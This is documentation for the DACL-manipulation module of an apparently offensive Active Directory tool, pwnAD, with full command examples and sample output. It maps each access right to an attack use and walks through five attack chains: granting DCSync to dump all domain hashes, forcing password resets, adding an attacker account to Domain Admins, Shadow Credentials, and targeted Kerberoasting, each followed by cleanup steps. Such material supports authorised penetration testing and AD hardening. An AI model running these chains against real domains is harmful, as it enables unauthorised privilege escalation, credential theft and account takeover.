# DACL (Discretionary Access Control Lists)

The `dacl` module allows manipulation of Access Control Entries (ACEs) on Active Directory objects. Based on [dacledit.py](https://github.com/fortra/impacket/blob/master/examples/dacledit.py) from Impacket.

## Overview

DACLs (Discretionary Access Control Lists) define who can access AD objects and what actions they can perform. The `dacl` module enables:

1. Reading and displaying ACEs on any object
2. Adding new ACEs (ALLOWED or DENIED) with predefined attack rights
3. Removing ACEs from objects
4. Backing up and restoring DACLs for cleanup

## Requirements

- **Permissions**: Read access to `nTSecurityDescriptor` (for reading), WriteDACL on target (for writing)
- **Domain**: Any AD DS domain functional level

## Usage

```bash
pwnAD [auth options] dacl <subcommand> [arguments]
```

## Subcommands

| Subcommand | Description |
|------------|-------------|
| `read` | Read and display the DACL of an object |
| `write` | Add an ACE to the DACL |
| `remove` | Remove ACEs from the DACL |
| `backup` | Backup the DACL to a JSON file |
| `restore` | Restore the DACL from a backup file |

## Available Rights

The following predefined rights are available for `write` and `remove` operations:

| Right | Description | Attack Use Case |
|-------|-------------|-----------------|
| `FullControl` | Full control over object | Complete object takeover |
| `GenericAll` | Generic all rights | Complete object takeover |
| `GenericWrite` | Generic write rights | Modify any attribute |
| `WriteDacl` | Modify DACL | Grant yourself more permissions |
| `WriteOwner` | Modify owner | Take ownership of object |
| `AllExtendedRights` | All extended rights | Multiple attacks (reset pwd, etc.) |
| `DCSync` | Replication rights (3 ACEs) | Extract all domain hashes |
| `ResetPassword` | User-Force-Change-Password | Reset user password |
| `WriteMembers` | Write to group members | Add users to groups |
| `AddMember` | Self-Membership | Add yourself to a group |
| `ReadGMSAPassword` | Read msDS-ManagedPassword | Retrieve gMSA password |
| `ReadLAPSPassword` | Read ms-Mcs-AdmPwd | Retrieve LAPS password |
| `WriteKeyCredentialLink` | Write ms-DS-Key-Credential-Link | Shadow Credentials attack |
| `WriteSPN` | Write servicePrincipalName | Targeted Kerberoasting |

## Subcommand Details

### read

Read and display the DACL of an object. Optionally filter by principal.

```bash
pwnAD [auth] dacl read <target> [--principal <principal>] [--resolve-sids]
```

**Arguments:**
- `target`: Target object (sAMAccountName, SID, or DN)
- `--principal`: Filter ACEs by this principal
- `--resolve-sids`: Resolve SIDs to names

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl read targetuser
[*] DACL for: CN=targetuser,CN=Users,DC=domain,DC=local
--------------------------------------------------------------------------------

[*]   ACE[0] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl
[*]     Trustee (SID)             : Domain Admins (S-1-5-21-...-512)

[*]   ACE[1] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Force-Change-Password (00299570-246d-11d0-a768-00aa006e0529)
[*]     Trustee (SID)             : helpdesk (S-1-5-21-...-1234)

[*] Total ACEs displayed: 2
```

**Filter by principal:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl read targetuser --principal helpdesk
```

### write

Add an ACE to the DACL of an object.

```bash
pwnAD [auth] dacl write <target> --principal <principal> --right <right> [--ace-type allowed|denied] [--inheritance]
```

**Arguments:**
- `target`: Target object to modify
- `--principal`: Principal to grant/deny rights (sAMAccountName or SID)
- `--right`: Right to grant (see Available Rights table)
- `--ace-type`: Type of ACE: `allowed` (default) or `denied`
- `--inheritance`: Set inheritance flags on the ACE

**Example - Grant DCSync:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl write "DC=domain,DC=local" --principal attacker --right DCSync
[*] Successfully added 3 ALLOWED ACE(s) for 'DCSync' to 'attacker' on 'DC=domain,DC=local'
```

**Example - Grant password reset:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl write targetuser --principal attacker --right ResetPassword
[*] Successfully added 1 ALLOWED ACE(s) for 'ResetPassword' to 'attacker' on 'targetuser'
```

**Example - Grant group membership write:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl write "Domain Admins" --principal attacker --right WriteMembers
[*] Successfully added 1 ALLOWED ACE(s) for 'WriteMembers' to 'attacker' on 'Domain Admins'
```

### remove

Remove ACEs from the DACL of an object.

```bash
pwnAD [auth] dacl remove <target> --principal <principal> [--right <right>] [--ace-type allowed|denied]
```

**Arguments:**
- `target`: Target object
- `--principal`: Principal whose ACEs to remove
- `--right`: Optional specific right to remove
- `--ace-type`: Optional filter by ACE type

**Example - Remove all ACEs for a principal:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl remove targetuser --principal attacker
[*] Successfully removed 2 ACE(s) for 'attacker' from 'targetuser'
```

**Example - Remove specific right:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl remove "DC=domain,DC=local" --principal attacker --right DCSync
[*] Successfully removed 3 ACE(s) for 'attacker' from 'DC=domain,DC=local'
```

### backup

Backup the DACL of an object to a JSON file for later restoration.

```bash
pwnAD [auth] dacl backup <target> [-o output.json]
```

**Arguments:**
- `target`: Target object to backup
- `-o, --output`: Output file path (default: `<target>_dacl_backup.json`)

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl backup targetuser
[*] DACL backed up successfully to: targetuser_dacl_backup.json
```

The backup file contains:
```json
{
  "target_dn": "CN=targetuser,CN=Users,DC=domain,DC=local",
  "security_descriptor": "0100...",
  "backup_timestamp": "2025-01-26 14:30:00",
  "domain": "domain.local"
}
```

### restore

Restore the DACL of an object from a backup file.

```bash
pwnAD [auth] dacl restore <backup_file>
```

**Arguments:**
- `backup_file`: Path to the backup JSON file

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' dacl restore targetuser_dacl_backup.json
[*] DACL restored successfully for: CN=targetuser,CN=Users,DC=domain,DC=local
[*] Backup was created at: 2025-01-26 14:30:00
```

## Attack Scenarios

### Scenario 1: DCSync Attack

Grant replication rights to extract all domain password hashes:

```bash
# Backup before modification (good practice)
pwnAD [auth] dacl backup "DC=domain,DC=local" -o domain_dacl_backup.json

# Grant DCSync rights
pwnAD [auth] dacl write "DC=domain,DC=local" --principal attacker --right DCSync

# Perform DCSync
secretsdump.py domain.local/attacker:'Pass!'@192.168.1.10 -just-dc

# Cleanup
pwnAD [auth] dacl remove "DC=domain,DC=local" --principal attacker --right DCSync
```

### Scenario 2: Password Reset Chain

Take over an account by resetting its password:

```bash
# Grant ResetPassword right
pwnAD [auth] dacl write targetuser --principal attacker --right ResetPassword

# Reset the password
pwnAD [auth] modify user targetuser --new-password 'NewP@ss123!'

# Cleanup
pwnAD [auth] dacl remove targetuser --principal attacker --right ResetPassword
```

### Scenario 3: Group Membership Abuse

Add yourself to a privileged group:

```bash
# Grant WriteMembers on the group
pwnAD [auth] dacl write "Domain Admins" --principal attacker --right WriteMembers

# Add yourself to the group
pwnAD [auth] add member "Domain Admins" attacker

# Cleanup (remove your ACE, but you're still in the group!)
pwnAD [auth] dacl remove "Domain Admins" --principal attacker --right WriteMembers
```

### Scenario 4: Shadow Credentials via DACL

Grant rights to perform Shadow Credentials attack:

```bash
# Grant WriteKeyCredentialLink
pwnAD [auth] dacl write targetuser --principal attacker --right WriteKeyCredentialLink

# Perform Shadow Credentials attack
pwnAD [auth] shadow auto targetuser

# Cleanup
pwnAD [auth] dacl remove targetuser --principal attacker --right WriteKeyCredentialLink
```

### Scenario 5: Targeted Kerberoasting

Set an SPN on a user account to kerberoast it:

```bash
# Grant WriteSPN right
pwnAD [auth] dacl write targetuser --principal attacker --right WriteSPN

# Add an SPN
pwnAD [auth] modify user targetuser --spn "HTTP/pwned.domain.local"

# Kerberoast
GetUserSPNs.py domain.local/attacker:'Pass!' -dc-ip 192.168.1.10 -request

# Cleanup
pwnAD [auth] modify user targetuser --spn ""
pwnAD [auth] dacl remove targetuser --principal attacker --right WriteSPN
```

## Interactive Mode

All DACL operations work in interactive mode:

```bash
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!'

pwnAD [domain.local\admin]> dacl read targetuser
pwnAD [domain.local\admin]> dacl write targetuser --principal attacker --right ResetPassword
pwnAD [domain.local\admin]> dacl backup targetuser
pwnAD [domain.local\admin]> dacl remove targetuser --principal attacker
```

## Troubleshooting

### "Cannot read nTSecurityDescriptor attribute (insufficient permissions?)"

You don't have read access to the security descriptor. Ensure you have:
- Read permission on the target object
- At minimum, `READ_CONTROL` access

### "Access denied" when writing

You don't have write permission to modify the DACL. You need:
- `WRITE_DACL` permission on the target
- Or ownership of the object

### "Unknown right: xxx"

The specified right is not recognized. Use one of the predefined rights from the Available Rights table.

### "No matching ACEs found for principal"

When trying to remove ACEs, no ACEs were found matching your criteria. Verify:
- The principal name/SID is correct
- The principal actually has ACEs on the target
- If using `--right`, that specific right exists for the principal

### "Object not found"

The target object doesn't exist. Check:
- Spelling of sAMAccountName
- DN format if using distinguished name
- User exists in the domain

## Best Practices

1. **Always backup before modifying** - Use `dacl backup` before any write operation
2. **Clean up after operations** - Remove added ACEs after achieving your objective
3. **Use specific rights** - Prefer specific rights (like `ResetPassword`) over broad ones (like `GenericAll`)
4. **Verify changes** - Use `dacl read` to confirm your modifications
5. **Document changes** - Keep track of what ACEs you've added for proper cleanup

## References

- [dacledit.py - Impacket](https://github.com/fortra/impacket/blob/master/examples/dacledit.py)
- [BloodHound Edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)
- [An ACE Up the Sleeve - SpecterOps](https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-900de0b03e9a)
- [MS-ADTS - Security Descriptors](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/)
- [AD Security - DACL Abuse](https://adsecurity.org/?p=3658)
